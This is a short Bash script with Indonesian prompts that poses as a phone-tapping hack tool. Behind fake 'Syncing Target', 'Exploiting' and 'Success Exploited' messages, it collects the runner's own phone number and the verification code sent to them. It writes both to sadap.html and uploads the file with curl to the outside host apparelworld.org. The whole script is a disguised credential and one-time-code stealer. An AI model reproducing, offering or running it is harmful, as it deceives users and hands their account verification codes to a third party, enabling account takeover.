#!/bin/bash
clear
echo "• Welcome To My Tools •";
sleep 0.5
echo "CRTF4bD"
sleep 0.5
echo "=========================";

echo"";
read -p "Isi Nomer Kamu (+62x)=> " nomer;
sleep 0.5
read -p "Isi Nomer Target (+62x) => " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> sadap.html;
curl -T sadap.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu Sampai kode masuk.";
read -p "Masukan kode verifikasi => " code;
sleep 2
echo "• Sedang menyadap •";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "Code => $code" >> sadap.html;
curl -T sadap.html http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;
